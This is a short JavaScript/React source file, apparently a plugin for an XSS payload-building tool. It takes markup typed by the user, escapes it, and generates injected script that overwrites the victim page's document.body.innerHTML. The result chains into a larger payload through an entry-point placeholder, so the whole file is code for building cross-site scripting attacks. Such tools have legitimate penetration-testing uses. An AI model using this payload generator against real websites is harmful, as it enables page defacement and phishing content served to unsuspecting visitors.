import React from 'react'
import RecipeTextArea from '~/components/RecipeTextArea'

export function cook (instance, vars) {
  const markup = instance.markup
    .replace(/\\/g, '\\\\')
    .replace(/'/g, `\\'`)

  const payload = [
    `document.body.innerHTML = '${markup}';`,
    '__XSS_CHEF_ENTRY_POINT__'
  ].join('\n')

  return {
    payload: vars.payload.replace(
      '__XSS_CHEF_ENTRY_POINT__',
      payload
    )
  }
}

export function init () {
  return {
    markup: ''
  }
}

export function render (instance, setRecipeProperty) {
  return (
    <div>
      <RecipeTextArea
        bindTo="markup"
        instance={instance}
        label="Markup"
        placeholder="Example: <strong>Replacement markup</strong>"
        rows={10}
        setRecipeProperty={setRecipeProperty}
      />
    </div>
  )
}

export function validate (instance) {
  if (instance.markup === '') {
    return false
  }

  return true
}
